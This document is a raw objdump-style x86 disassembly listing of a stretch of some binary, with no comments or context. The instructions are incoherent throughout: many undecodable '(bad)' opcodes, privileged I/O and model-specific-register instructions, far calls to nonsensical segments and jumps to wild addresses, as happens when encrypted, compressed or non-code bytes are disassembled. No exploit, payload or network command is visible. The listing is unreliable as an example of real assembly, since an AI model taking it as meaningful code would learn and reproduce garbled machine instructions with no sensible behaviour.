  41d7ad:	rcr    BYTE PTR [eax+0x482f953b],1
  41d7b3:	add    ch,ah
  41d7b5:	call   0xa897f085
  41d7ba:	adc    DWORD PTR [edi],0x431928f1
  41d7c0:	cmp    DWORD PTR [edi-0x10],ecx
  41d7c3:	jb     0x41d7c9
  41d7c5:	imul   eax,DWORD PTR [ebp+0x45cea697],0xffffffed
  41d7cc:	stos   BYTE PTR es:[edi],al
  41d7cd:	cwde   
  41d7ce:	pop    ebx
  41d7cf:	push   eax
  41d7d0:	aas    
  41d7d1:	dec    ecx
  41d7d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7d4:	xor    BYTE PTR [eax+0x2e],cl
  41d7d7:	inc    edx
  41d7d8:	cmp    eax,0xdc4e78d8
  41d7dd:	in     al,0xea
  41d7df:	retf   0x2563
  41d7e2:	adc    BYTE PTR [eax+0x32],bl
  41d7e5:	int3   
  41d7e6:	sbb    BYTE PTR [ebx+0x38],ah
  41d7e9:	add    DWORD PTR [ebx],esp
  41d7eb:	xor    BYTE PTR [ebx-0x69],0x62
  41d7ef:	fcom   QWORD PTR [edx+0x30]
  41d7f2:	int3   
  41d7f3:	fbld   TBYTE PTR [eax+esi*8-0xa]
  41d7f7:	dec    ebp
  41d7f8:	ds das 
  41d7fa:	push   0xffffffab
  41d7fc:	jb     0x41d812
  41d7fe:	jmp    0x51cfd2f6
  41d803:	dec    eax
  41d804:	call   0x5527:0xeda381e3
  41d80b:	stos   BYTE PTR es:[edi],al
  41d80c:	cmc    
  41d80d:	fxch   st(6)
  41d80f:	dec    edi
  41d810:	mov    al,ds:0xe1079265
  41d815:	imul   esi,DWORD PTR [esi],0xffffffb5
  41d818:	xor    eax,0xa2e18194
  41d81d:	sbb    ebp,DWORD PTR [edx+0xe359752]
  41d823:	xchg   esi,eax
  41d824:	outs   dx,BYTE PTR ds:[esi]
  41d825:	pop    esp
  41d826:	push   ebp
  41d827:	cmp    al,0xf8
  41d829:	addr16 add eax,esp
  41d82c:	sub    al,0x6a
  41d82e:	aam    0x26
  41d830:	push   ebx
  41d831:	sbb    al,0x2a
  41d833:	pop    edx
  41d834:	inc    esp
  41d835:	nop
  41d836:	cs aas 
  41d838:	and    al,0xc5
  41d83a:	mov    dh,0x81
  41d83c:	sub    eax,0xcbc0d801
  41d841:	sbb    eax,0x7c08e97c
  41d846:	xchg   ecx,eax
  41d847:	add    BYTE PTR [esi+0x34992c79],dl
  41d84d:	mov    ds:0x5ee5a436,al
  41d852:	(bad)  
  41d853:	out    0xea,eax
  41d855:	jb     0x41d86d
  41d857:	cmc    
  41d858:	mov    esp,0x3197c4f
  41d85d:	loope  0x41d820
  41d85f:	addr16 and eax,0xa5977fa0
  41d865:	(bad)  
  41d866:	pop    ds
  41d867:	jecxz  0x41d818
  41d869:	mov    ds:0xfe36a5ad,eax
  41d86e:	vmread ebx,edx
  41d871:	adc    bh,BYTE PTR [eax+0x77d9ab41]
  41d877:	je     0x41d8a5
  41d879:	jmp    0x41d849
  41d87b:	pushf  
  41d87c:	ror    DWORD PTR [ecx],1
  41d87e:	add    ebp,DWORD PTR [ebp-0x284c66bb]
  41d884:	clc    
  41d885:	jne    0x41d8ba
  41d887:	pop    eax
  41d888:	in     al,dx
  41d889:	cmp    esi,DWORD PTR [edx-0x27]
  41d88c:	xchg   esi,eax
  41d88d:	arpl   WORD PTR [eax+0x200e9a50],sp
  41d893:	adc    DWORD PTR [eax+0x6],esp
  41d896:	xor    edx,edx
  41d898:	les    ecx,FWORD PTR [esi-0x29]
  41d89b:	fidivr WORD PTR [ebp-0x3]
  41d89e:	dec    ebx
  41d89f:	mov    ds:0xf9a60389,al
  41d8a4:	jl     0x41d905
  41d8a6:	test   eax,0x7b790ee0
  41d8ab:	pop    ecx
  41d8ac:	mov    WORD PTR [ecx],?
  41d8ae:	sbb    edx,eax
  41d8b0:	pop    edi
  41d8b1:	or     ebx,DWORD PTR [ebx-0x23061a16]
  41d8b7:	cmp    al,0xc6
  41d8b9:	std    
  41d8ba:	ds jns 0x41d92b
  41d8bd:	cmp    al,0x7
  41d8bf:	scas   al,BYTE PTR es:[edi]
  41d8c0:	dec    edi
  41d8c1:	inc    edx
  41d8c2:	imul   ecx,esp,0x90f9f9ee
  41d8c8:	aam    0xf8
  41d8ca:	jbe    0x41d8d4
  41d8cc:	loopne 0x41d8ef
  41d8ce:	xor    esp,ebp
  41d8d0:	and    DWORD PTR [eax-0x4d],0x9bf18c76
  41d8d7:	dec    esi
  41d8d8:	pop    ss
  41d8d9:	mov    ?,WORD PTR ds:0xcafae053
  41d8df:	dec    edi
  41d8e0:	daa    
  41d8e1:	out    dx,al
  41d8e2:	cli    
  41d8e3:	dec    ebx
  41d8e4:	inc    eax
  41d8e5:	jmp    0x41d936
  41d8e7:	adc    al,0x1
  41d8e9:	sbb    dl,al
  41d8eb:	fisub  WORD PTR [edi]
  41d8ed:	push   ss
  41d8ee:	and    edi,DWORD PTR [eax+0x6a391d65]
  41d8f4:	xchg   ecx,eax
  41d8f5:	add    bh,BYTE PTR [esi+0x1]
  41d8f8:	push   ss
  41d8f9:	sub    DWORD PTR [edi+0x778b636d],ebx
  41d8ff:	and    eax,0x1d71e3fc
  41d904:	adc    dl,BYTE PTR [eax+0x55]
  41d907:	xchg   ecx,eax
  41d908:	sar    BYTE PTR [eax+0x67],1
  41d90b:	sub    DWORD PTR [ebx],ebx
  41d90d:	das    
  41d90e:	das    
  41d90f:	inc    ebp
  41d910:	sub    al,bl
  41d912:	pop    edi
  41d913:	add    DWORD PTR [ebx+edi*1-0x29ee4c1c],ecx
  41d91a:	lock (bad) 
  41d91c:	mov    DWORD PTR [ebx-0x707bb39e],0x17832fa
  41d926:	jmp    0x41d8d5
  41d928:	jne    0x41d8b8
  41d92a:	fst    st(2)
  41d92c:	mov    eax,0xdd5438b2
  41d931:	icebp  
  41d932:	je     0x41d925
  41d934:	lds    ebp,FWORD PTR ds:0x602a328c
  41d93a:	cmc    
  41d93b:	push   ebx
  41d93c:	dec    edx
  41d93d:	pop    ecx
  41d93e:	mov    ds:0x62bd397,eax
  41d943:	std    
  41d944:	lock arpl ax,ax
  41d947:	out    dx,eax
  41d948:	out    dx,al
  41d949:	mov    DWORD PTR [ecx+0xa3a5143],edi
  41d94f:	loop   0x41d94e
  41d951:	mov    cl,BYTE PTR [edx+0x1778d1eb]
  41d957:	xor    eax,0xe7e2b57a
  41d95c:	adc    BYTE PTR [ebp+ebp*1+0x2d9ab4eb],dh
  41d963:	frstor [edx+ebp*4-0x51c3b56e]
  41d96a:	test   BYTE PTR [ebx],dl
  41d96c:	or     edi,DWORD PTR [ecx+0xd]
  41d96f:	fisubr WORD PTR [ebx+eiz*1-0x693bd10a]
  41d976:	sbb    al,0xa3
  41d978:	lds    ebx,FWORD PTR [edx]
  41d97a:	mov    esi,0x388c6cae
  41d97f:	push   eax
  41d980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d981:	mov    ds:0xb1f27ff5,eax
  41d986:	mov    ds:0x45f805c4,eax
  41d98b:	loop   0x41d998
  41d98d:	adc    DWORD PTR [edx+0x31],edx
  41d990:	icebp  
  41d991:	or     esi,edi
  41d993:	pop    ss
  41d994:	out    0x7a,al
  41d996:	ret    0x9b81
  41d999:	sub    bh,dh
  41d99b:	mov    gs,esi
  41d99d:	cmp    eax,0xdddb5268
  41d9a2:	dec    ebp
  41d9a3:	outs   dx,BYTE PTR ds:[esi]
  41d9a4:	dec    esp
  41d9a5:	add    BYTE PTR [edi-0xef4c824],ah
  41d9ab:	test   eax,0x7b493e30
  41d9b0:	sbb    ah,dh
  41d9b2:	sbb    DWORD PTR [edx],esi
  41d9b4:	(bad)  
  41d9b6:	add    al,0xa9
  41d9b8:	jmp    0x41d93b
  41d9ba:	iret   
  41d9bb:	(bad)  
  41d9bc:	xor    ebx,DWORD PTR [ebp+0x4cc75531]
  41d9c2:	jmp    0x8ce9:0x52ffec11
  41d9c9:	inc    ebx
  41d9ca:	sub    ch,ah
  41d9cc:	das    
  41d9cd:	pop    ebp
  41d9ce:	mov    eax,ds:0xbdd8b725
  41d9d3:	pop    edi
  41d9d4:	lahf   
  41d9d5:	lods   eax,DWORD PTR ds:[esi]
  41d9d6:	xor    BYTE PTR [ecx-0x4e],dh
  41d9d9:	mov    edi,0x3f207147
  41d9de:	cwde   
  41d9df:	dec    eax
  41d9e0:	sti    
  41d9e1:	stos   BYTE PTR es:[edi],al
  41d9e2:	inc    ecx
  41d9e3:	jecxz  0x41d9eb
  41d9e5:	outs   dx,BYTE PTR ds:[esi]
  41d9e6:	jecxz  0x41d9f6
  41d9e8:	adc    DWORD PTR [edi-0x6693aa64],eax
  41d9ee:	(bad)  
  41d9ef:	mov    dh,0x15
  41d9f1:	jp     0x41da20
  41d9f3:	adc    DWORD PTR [ebx+0x20e94ce3],eax
  41d9f9:	or     BYTE PTR [ebp+0x72],ch
  41d9fc:	popa   
  41d9fd:	pop    edi
  41d9fe:	idiv   BYTE PTR [ebx+0x1ac5849e]
  41da04:	lock imul ebp,DWORD PTR [ebx+0x38967bc0],0x7a8a7fa1
  41da0f:	sbb    al,0x24
  41da11:	pusha  
  41da12:	loope  0x41da2c
  41da14:	jecxz  0x41da58
  41da16:	fcom   st(2)
  41da18:	pop    eax
  41da19:	xor    al,0x1c
  41da1b:	sti    
  41da1c:	clc    
  41da1d:	push   esi
  41da1e:	dec    ebp
  41da1f:	mov    ebp,0x40241bb9
  41da24:	dec    eax
  41da25:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41da27:	xchg   al,bh
  41da29:	inc    ecx
  41da2a:	push   ds
  41da2b:	pop    ebp
  41da2c:	mov    cl,0xae
  41da2e:	sbb    al,0x7
  41da30:	jge    0x41da9c
  41da32:	fwait
  41da33:	push   edx
  41da34:	stc    
  41da35:	cld    
  41da36:	retf   
  41da37:	and    edx,DWORD PTR [ebx-0x15]
  41da3a:	push   esi
  41da3b:	cld    
  41da3c:	out    0x8c,eax
  41da3e:	cdq    
  41da3f:	pushf  
  41da40:	fs push 0x2a6d0edc
  41da46:	mov    bl,0x4
  41da48:	jae    0x41da6b
  41da4a:	in     al,0x9f
  41da4c:	and    esi,edx
  41da4e:	inc    esi
  41da4f:	shl    ch,1
  41da51:	call   0xa967:0xcf2aca0f
  41da58:	mov    cl,0x3c
  41da5a:	push   0xe0933990
  41da5f:	xchg   ecx,eax
  41da60:	push   ss
  41da61:	dec    ecx
  41da62:	mov    al,0x8
  41da64:	push   ecx
  41da65:	adc    al,0x67
  41da67:	mov    DWORD PTR [esi-0x56c16618],edx
  41da6d:	test   eax,0x39f85453
  41da72:	leave  
  41da73:	mov    bh,0xd
  41da75:	sar    esi,cl
  41da77:	pop    es
  41da78:	pop    eax
  41da79:	iret   
  41da7a:	and    eax,0x2d1809c4
  41da7f:	repnz cmp DWORD PTR [ebp-0x55],esi
  41da83:	mov    ebp,0x45b5eb24
  41da88:	adc    DWORD PTR [esi-0x6b],ebx
  41da8b:	mov    ebx,0x24e0b633
  41da90:	adc    dh,BYTE PTR [edi-0x1aafe8d0]
  41da96:	lds    ebp,FWORD PTR [eax-0x2fad922a]
  41da9c:	pop    ss
  41da9d:	pop    es
  41da9e:	mov    BYTE PTR [esi],dl
  41daa0:	aaa    
  41daa1:	shl    BYTE PTR [ebp+0x76],cl
  41daa4:	dec    ecx
  41daa5:	mov    al,0xbd
  41daa7:	pop    ss
  41daa8:	stos   BYTE PTR es:[edi],al
  41daa9:	out    dx,eax
  41daaa:	inc    edx
  41daab:	mov    ds:0xc5b010d1,al
  41dab0:	and    DWORD PTR [ebx+0x45],ebp
  41dab3:	ret    0x548b
  41dab6:	add    BYTE PTR [edi+ebp*4],bh
  41dab9:	mov    ebx,0xf4d0c586
  41dabe:	ins    BYTE PTR es:[edi],dx
  41dabf:	dec    eax
  41dac0:	call   0xd5634d46
  41dac5:	(bad)  
  41dac6:	mov    ss,WORD PTR [esp+edx*1]
  41dac9:	into   
  41daca:	ins    BYTE PTR es:[edi],dx
  41dacb:	and    esi,ebp
  41dacd:	les    ecx,FWORD PTR [ecx-0x664699fd]
  41dad3:	or     edi,ebp
  41dad5:	sub    DWORD PTR [esi-0x19],edi
  41dad8:	out    0x70,al
  41dada:	popa   
  41dadb:	mov    ds:0xb46e825b,eax
  41dae0:	cwde   
  41dae1:	mov    bl,0xe9
  41dae3:	mov    ebp,0xefdb1c75
  41dae8:	fwait
  41dae9:	push   ecx
  41daea:	ss sbb eax,DWORD PTR ds:[ebp-0x2a]
  41daef:	jb     0x41dad0
  41daf1:	cmp    ch,bh
  41daf3:	and    edx,DWORD PTR [edi+0x63]
  41daf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daf7:	push   ds
  41daf8:	ins    DWORD PTR es:[edi],dx
  41daf9:	or     ebp,ecx
  41dafb:	test   BYTE PTR [ecx+0x1484f0f],al
  41db01:	(bad)  
  41db03:	or     al,0xd2
  41db05:	push   ss
  41db06:	or     dl,BYTE PTR [ebp+0x21a83193]
  41db0c:	nop
  41db0d:	xchg   ecx,eax
  41db0e:	fld    DWORD PTR [edx]
  41db10:	and    ecx,DWORD PTR [edi-0x27]
  41db13:	adc    BYTE PTR [edi-0x6c7bb018],al
  41db19:	mov    cl,BYTE PTR [ebp-0x44]
  41db1c:	push   ecx
  41db1d:	in     al,0x5d
  41db1f:	and    DWORD PTR [edi+0x3dfa48d4],edx
  41db25:	xchg   edi,eax
  41db26:	aad    0x29
  41db28:	imul   esp,DWORD PTR [eax+0x763b5df1],0x141b6dcf
  41db32:	pop    ebx
  41db33:	cdq    
  41db34:	cmp    eax,0x1389be15
  41db39:	inc    ebx
  41db3a:	into   
  41db3b:	sub    DWORD PTR [esi+ebx*2],edi
  41db3e:	push   ebp
  41db3f:	imul   ebp,eax,0x2cc581ea
  41db45:	pop    ebx
  41db46:	(bad)  
  41db47:	jo     0x41db8c
  41db49:	adc    BYTE PTR [edx-0x6b],bh
  41db4c:	mov    cl,0x35
  41db4e:	xor    DWORD PTR [eax+0x5f422957],0x5b
  41db55:	xchg   esi,esp
  41db57:	cdq    
  41db58:	out    dx,eax
  41db59:	mul    esp
  41db5b:	xchg   esi,eax
  41db5c:	(bad)  
  41db5d:	sub    dh,BYTE PTR [ecx]
  41db5f:	and    al,0x39
  41db61:	mov    cl,0xa8
  41db63:	pop    edi
  41db64:	xchg   edx,eax
  41db65:	cmp    BYTE PTR [ebp+0x56a43d21],bh
  41db6b:	pop    ebp
  41db6c:	mov    ch,0x42
  41db6e:	test   BYTE PTR [ecx+ebp*1-0x52c7a92e],bh
  41db75:	aam    0x8c
  41db77:	jo     0x41db8f
  41db79:	(bad)  
  41db7a:	push   ecx
  41db7b:	mov    al,ds:0x5cce5f07
  41db80:	adc    eax,0xcb58c1c7
  41db85:	or     dl,BYTE PTR [edx]
  41db87:	add    esi,ebp
  41db89:	jnp    0x41db7e
  41db8b:	jle    0x41db33
  41db8d:	jge    0x41db20
  41db8f:	cmp    esp,edx
  41db91:	dec    ebx
  41db92:	aas    
  41db93:	dec    edx
  41db94:	cmp    eax,0x4f343d4d
  41db99:	aas    
  41db9a:	or     DWORD PTR [eax+0x35],ecx
  41db9d:	(bad)  
  41db9f:	xor    al,0xf1
  41dba1:	mov    bh,0x18
  41dba3:	adc    eax,edx
  41dba5:	in     eax,dx
  41dba6:	jmp    0x41db31
  41dba8:	fld    DWORD PTR [ecx+0x71]
  41dbab:	pop    esp
  41dbac:	arpl   WORD PTR [ebx],dx
  41dbae:	mov    ah,0xf5
  41dbb0:	out    0xc9,eax
  41dbb2:	test   eax,0x1dea014f
  41dbb7:	add    DWORD PTR [ecx+0x73],ebx
  41dbba:	sub    eax,0xe0f559cc
  41dbbf:	call   0xb9c7c3fb
  41dbc4:	enter  0x7e9e,0xc6
  41dbc8:	outs   dx,DWORD PTR ds:[esi]
  41dbc9:	add    BYTE PTR [esi-0x64],0x86
  41dbcd:	in     eax,dx
  41dbce:	dec    ebx
  41dbcf:	adc    eax,0x79806ec1
  41dbd4:	jecxz  0x41dc49
  41dbd6:	mov    ah,0x3d
  41dbd8:	xor    al,BYTE PTR [esi+0x3132b1c2]
  41dbde:	je     0x41db90
  41dbe0:	pushf  
  41dbe1:	add    BYTE PTR [esi-0x111e8775],bh
  41dbe7:	mov    BYTE PTR [edx+eiz*8],0x54
  41dbeb:	mov    cl,0xa8
  41dbed:	push   ss
  41dbee:	je     0x41dc29
  41dbf0:	push   eax
  41dbf1:	in     eax,0xd5
  41dbf3:	clc    
  41dbf4:	scas   eax,DWORD PTR es:[edi]
  41dbf5:	in     al,0xbe
  41dbf7:	push   ds
  41dbf8:	inc    eax
  41dbf9:	sbb    al,0xed
  41dbfb:	call   0x3317:0xef69ab23
  41dc02:	mov    bh,0x72
  41dc04:	fstp   DWORD PTR [ecx-0x393c299c]
  41dc0a:	(bad)  
  41dc0b:	fwait
  41dc0c:	add    DWORD PTR [ecx],edx
  41dc0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc10:	aad    0x5b
  41dc12:	addps  xmm4,XMMWORD PTR [edi+0x1a]
  41dc16:	xor    bh,0x70
  41dc19:	sub    esi,ebp
  41dc1b:	xchg   BYTE PTR [ebp+ebx*2-0x2],dh
  41dc1f:	cdq    
  41dc20:	xchg   edi,eax
  41dc21:	mov    bl,0x78
  41dc23:	mov    al,ds:0xd90e1afe
  41dc28:	test   al,0xd8
  41dc2a:	dec    eax
  41dc2b:	call   0x7328b497
  41dc30:	call   DWORD PTR [edi+0x50f4693]
  41dc36:	fidivr DWORD PTR [edx-0x30b1fb85]
  41dc3c:	dec    ebp
  41dc3d:	push   ecx
  41dc3e:	stos   DWORD PTR es:[edi],eax
  41dc3f:	scas   eax,DWORD PTR es:[edi]
  41dc40:	dec    ebx
  41dc41:	lods   al,BYTE PTR ds:[esi]
  41dc42:	push   ss
  41dc43:	add    eax,0xeca88fe9
  41dc48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc49:	xor    bl,0x78
  41dc4c:	out    dx,al
  41dc4d:	pop    ds
  41dc4e:	mov    ebp,0x67704a84
  41dc53:	mov    al,BYTE PTR [eax+edi*8-0x27a3473c]
  41dc5a:	inc    ecx
  41dc5b:	test   eax,0x568b630e
  41dc60:	outs   dx,BYTE PTR ds:[esi]
  41dc61:	mov    cx,0x8110
  41dc65:	mov    eax,ds:0x89930bfc
  41dc6a:	(bad)  [eax]
  41dc6c:	and    bl,BYTE PTR [edx+0x36]
  41dc6f:	cmp    al,0x98
  41dc71:	dec    esp
  41dc72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc73:	xchg   ebx,eax
  41dc74:	imul   edx,DWORD PTR [eax-0x37],0x2e
  41dc78:	sub    dh,BYTE PTR [esp+edi*2]
  41dc7b:	jle    0x41dc02
  41dc7d:	xor    edx,DWORD PTR [ebp-0x74]
  41dc80:	jo     0x41dc6e
  41dc82:	inc    eax
  41dc83:	jmp    0xc42eba9e
  41dc88:	mov    esp,DWORD PTR [eax+0x73]
  41dc8b:	stos   BYTE PTR es:[edi],al
  41dc8c:	xchg   esp,eax
  41dc8d:	sbb    DWORD PTR [esi+0x7dd2a9e9],0x3fa4e71b
  41dc97:	cmp    eax,0xdcf1489b
  41dc9c:	and    al,0xcd
  41dc9e:	sub    eax,0x596e0366
  41dca3:	and    al,0xd2
  41dca5:	adc    BYTE PTR [edi],cl
  41dca7:	sar    bl,0x6d
  41dcaa:	push   0xffffff96
  41dcac:	mov    edx,0x8fb0d27a
  41dcb1:	cmc    
  41dcb2:	imul   ecx,DWORD PTR [eax-0x29221107],0x14
  41dcb9:	or     eax,0xd9d323c8
  41dcbe:	or     eax,0x81c3ad32
  41dcc3:	jmp    DWORD PTR [ecx+0x6a]
  41dcc6:	in     eax,0x59
  41dcc8:	adc    al,0x5
  41dcca:	aad    0xd5
  41dccc:	push   edi
  41dccd:	dec    edx
  41dcce:	sub    ah,BYTE PTR [ebp+esi*4-0x320f0981]
  41dcd5:	mov    esi,DWORD PTR [ebp+0x108c17f7]
  41dcdb:	xor    ebx,DWORD PTR [edi]
  41dcdd:	xchg   DWORD PTR ds:0xfe4df83b,esp
  41dce3:	push   eax
  41dce4:	or     edi,ecx
  41dce6:	repnz xor bh,ah
  41dce9:	shl    DWORD PTR ds:[esi],1
  41dcec:	outs   dx,BYTE PTR ds:[esi]
  41dced:	fsubr  st(2),st
  41dcef:	pop    DWORD PTR [ebx]
  41dcf1:	push   cs
  41dcf2:	js     0x41dd46
  41dcf4:	retf   
  41dcf5:	inc    esp
  41dcf6:	rcl    DWORD PTR [ebx+0x66bad470],0x8e
  41dcfd:	test   ecx,edi
  41dcff:	in     al,0x81
  41dd01:	mov    cl,0x3d
  41dd03:	int3   
  41dd04:	sub    BYTE PTR [ebx+0x65],al
  41dd07:	aaa    
  41dd08:	(bad)  
  41dd0a:	loope  0x41dcd1
  41dd0c:	pusha  
  41dd0d:	xchg   edx,eax
  41dd0e:	jmp    0x41dca3
  41dd10:	out    dx,al
  41dd11:	adc    cl,BYTE PTR [eax-0x1fb79f01]
  41dd17:	mov    ebp,0xdf4fda64
  41dd1c:	xchg   esi,eax
  41dd1d:	cmp    bl,cl
  41dd1f:	and    BYTE PTR [esi],al
  41dd21:	mov    eax,ds:0x5e83c1e9
  41dd26:	fmul   QWORD PTR [esi]
  41dd28:	xchg   dh,ch
  41dd2a:	and    al,0x0
  41dd2c:	sbb    al,0x1e
  41dd2e:	push   ecx
  41dd2f:	and    al,0x1f
  41dd31:	and    ebx,DWORD PTR [edx+0x3d]
  41dd34:	adc    edi,DWORD PTR [ecx-0x2911abde]
  41dd3a:	lds    edi,FWORD PTR [ecx+0x3f]
  41dd3d:	mov    BYTE PTR [ecx+0x3026cf33],ah
  41dd43:	data16 jle 0x41dcf5
  41dd46:	lea    edi,[edx-0x6f]
  41dd49:	mov    ds:0xcecfe52b,eax
  41dd4e:	bound  edx,QWORD PTR [esi+0x56]
  41dd51:	cmp    al,0xf5
  41dd53:	popa   
  41dd54:	mov    dh,0xc5
  41dd56:	push   esp
  41dd57:	and    BYTE PTR [edx+0x75],bh
  41dd5a:	xlat   BYTE PTR ds:[ebx]
  41dd5b:	imul   esi,ecx,0xc74f77e1
  41dd61:	cmp    cl,BYTE PTR [ecx+0xd]
  41dd64:	cwde   
  41dd65:	(bad)  
  41dd69:	mov    dh,0x75
  41dd6b:	fcom   QWORD PTR ds:0x67032adf
  41dd71:	pop    ds
  41dd72:	mov    esp,ecx
  41dd74:	pop    ebp
  41dd75:	jp     0x41dd40
  41dd77:	sbb    edx,DWORD PTR [ebx+eax*8-0x1c]
  41dd7b:	mov    ds:0x3beef13c,eax
  41dd80:	dec    eax
  41dd81:	sub    DWORD PTR [edx-0x33],0xb23470aa
  41dd88:	cmp    eax,0x41b431df
  41dd8d:	clc    
  41dd8e:	nop
  41dd8f:	xchg   ecx,eax
  41dd90:	adc    BYTE PTR [eax+esi*8-0x5c7342de],cl
  41dd97:	and    BYTE PTR [ecx+0x7d37f38c],dl
  41dd9d:	nop    DWORD PTR [ecx+0x49]
  41dda1:	jo     0x41dde2
  41dda3:	add    BYTE PTR [ecx],ch
  41dda5:	sub    esp,DWORD PTR [ebp+0x38]
  41dda8:	push   0x20223f15
  41ddad:	add    bh,0xcb
  41ddb0:	xchg   esi,eax
  41ddb1:	mov    bl,0x63
  41ddb3:	mov    edi,0x42a20a61
  41ddb8:	out    0xe3,al
  41ddba:	mov    ds:0x37ac2d6f,eax
  41ddbf:	xor    cl,BYTE PTR [edi+0x5bb970fc]
  41ddc5:	mov    eax,0x425433be
  41ddca:	adc    BYTE PTR [edi-0x2d],dh
  41ddcd:	jnp    0x41ddbd
  41ddcf:	jg     0x41de2b
  41ddd1:	stc    
  41ddd2:	or     BYTE PTR [edi-0x32f54576],al
  41ddd8:	loope  0x41dd7c
  41ddda:	int3   
  41dddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dddc:	ja     0x41dd6a
  41ddde:	ds adc eax,0x59d1f2b8
  41dde4:	fwait
  41dde5:	jo     0x99a865b6
  41ddeb:	push   ebp
  41ddec:	jg     0x41ddd6
  41ddee:	or     DWORD PTR [eax-0x1e],ebx
  41ddf1:	mov    esi,0x1f890abe
  41ddf6:	pusha  
  41ddf7:	and    eax,edi
  41ddf9:	push   di
  41ddfb:	icebp  
  41ddfc:	fdiv   DWORD PTR [eax]
  41ddfe:	cmp    al,0x6f
  41de01:	cmp    edi,ebx
  41de03:	pop    ebx
  41de04:	ins    DWORD PTR es:[edi],dx
  41de05:	cmp    dh,BYTE PTR [esi+edi*2-0x70e2367c]
  41de0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de0d:	inc    esp
  41de0e:	ins    BYTE PTR es:[edi],dx
  41de0f:	sub    DWORD PTR [esi+0x1f84959c],0xa1b71872
  41de19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de1a:	dec    ecx
  41de1b:	jae    0x41ddb3
  41de1d:	in     eax,0xe0
  41de1f:	xchg   esp,eax
  41de20:	mov    al,0x9c
  41de22:	xor    eax,edx
  41de24:	mov    edi,0xbb1c2370
  41de29:	mov    ds:0xeab57f2f,al
  41de2e:	ss jae 0x41de99
  41de31:	aas    
  41de32:	(bad)  
  41de33:	jle    0x41de73
  41de35:	dec    esp
  41de36:	call   0x1b1f21c2
  41de3b:	stc    
  41de3c:	jl     0x41de23
  41de3e:	mov    gs,WORD PTR [eax+0x48]
  41de41:	and    eax,0x76e05873
  41de46:	std    
  41de47:	retf   
  41de48:	retf   
  41de49:	retf   0xd589
  41de4c:	dec    esi
  41de4d:	dec    edi
  41de4e:	test   DWORD PTR [esi+0x14],ecx
  41de51:	jae    0x41dde6
  41de53:	xchg   BYTE PTR es:[ebx-0x4d],bh
  41de57:	add    eax,0xd4e0d2f2
  41de5c:	and    DWORD PTR [ecx+ebp*1],esp
  41de5f:	loope  0x41dde1
  41de61:	dec    ecx
  41de62:	push   ss
  41de63:	mov    ah,0x90
  41de65:	and    eax,0x28553bd6
  41de6a:	xchg   DWORD PTR [edx-0x37],esp
  41de6d:	cdq    
  41de6e:	xlat   BYTE PTR ds:[ebx]
  41de6f:	xchg   esi,eax
  41de70:	loopne 0x41de59
  41de72:	cmp    al,0xd0
  41de74:	jb     0x41de1a
  41de76:	xor    DWORD PTR [ecx+0x48],edx
  41de79:	mov    dh,0xcf
  41de7b:	retf   
  41de7c:	scas   eax,DWORD PTR es:[edi]
  41de7d:	rdmsr  
  41de7f:	push   edx
  41de80:	jmp    0x41de91
  41de82:	and    BYTE PTR [ebx-0x3656bdf8],ch
  41de88:	leave  
  41de89:	pop    DWORD PTR [edi-0x3c69f33b]
  41de8f:	push   esi
  41de90:	push   ebp
  41de91:	dec    ecx
  41de92:	cdq    
  41de93:	xchg   esi,eax
  41de94:	mov    edx,0xdcc4c1f
  41de99:	out    0xc6,eax
  41de9b:	adc    eax,DWORD PTR [ebx-0x4291a750]
  41dea1:	cmp    BYTE PTR [edi],ah
  41dea3:	sub    BYTE PTR [ebp-0x4febbf2d],al
  41dea9:	xchg   ecx,eax
  41deaa:	ficomp WORD PTR [eax]
  41deac:	mov    ds:0x6c021b35,al
  41deb1:	adc    eax,0x19e0fe87
  41deb6:	int3   
  41deb7:	dec    ecx
  41deb8:	mov    esi,0xffd3978
  41debd:	ret    0x54a8
  41dec0:	fs dec esp
  41dec2:	bound  edi,QWORD PTR [eax+0x1c26c55f]
  41dec8:	enter  0x800e,0xd
  41decc:	aam    0x6a
  41dece:	pop    edx
  41decf:	pushf  
  41ded0:	xchg   edi,eax
  41ded1:	out    dx,eax
  41ded2:	and    ah,BYTE PTR [ebx]
  41ded4:	adc    eax,ebx
  41ded6:	jl     0x41de80
  41ded8:	mov    BYTE PTR [edx-0x29],bh
  41dedb:	fsubr  DWORD PTR [edi-0x37]
  41dede:	mov    dl,0xf3
  41dee0:	gs pop ecx
  41dee2:	mov    ss,WORD PTR [eax+0x3c1979ec]
  41dee8:	xchg   esi,eax
  41dee9:	jnp    0x41df41
  41deeb:	test   eax,0x69a0ace9
  41def0:	inc    ecx
  41def1:	xacquire xchg DWORD PTR [edi+ebx*2],edi
  41def5:	or     ebp,DWORD PTR [ebx+0x3aa2cad8]
  41defb:	cwde   
  41defc:	mov    ds:0x7bac1685,eax
  41df01:	cmp    cl,BYTE PTR [eax-0x2af2cddd]
  41df07:	pop    ds
  41df08:	sbb    eax,DWORD PTR [ebp+0x11f88471]
  41df0e:	mov    al,dh
  41df10:	outs   dx,BYTE PTR ds:[esi]
  41df11:	scas   eax,DWORD PTR es:[edi]
  41df12:	jb     0x41df3a
  41df14:	neg    BYTE PTR [edx]
  41df16:	leave  
  41df17:	rcr    BYTE PTR [edx+0x3],0xe8
  41df1b:	mov    ds:0x2b0ce338,al
  41df20:	loopne 0x41df7e
  41df22:	arpl   WORD PTR [eax+0x6],dx
  41df25:	arpl   bx,sp
  41df27:	xchg   ebx,eax
  41df28:	dec    ebx
  41df29:	push   cs
  41df2a:	pushf  
  41df2b:	jb     0x41df36
  41df2d:	xchg   edi,eax
  41df2e:	ds sti 
  41df30:	shr    DWORD PTR [esi-0x6d],cl
  41df33:	ret    0xfc1f
  41df36:	ret    0xd595
  41df39:	pop    ss
  41df3a:	mov    edx,0x4b654e96
  41df3f:	fimul  DWORD PTR [eax+0x41]
  41df42:	cmp    BYTE PTR [ebx-0x5247a2aa],ah
  41df48:	mov    ah,cl
  41df4a:	fild   DWORD PTR [edx]
  41df4c:	stos   BYTE PTR es:[edi],al
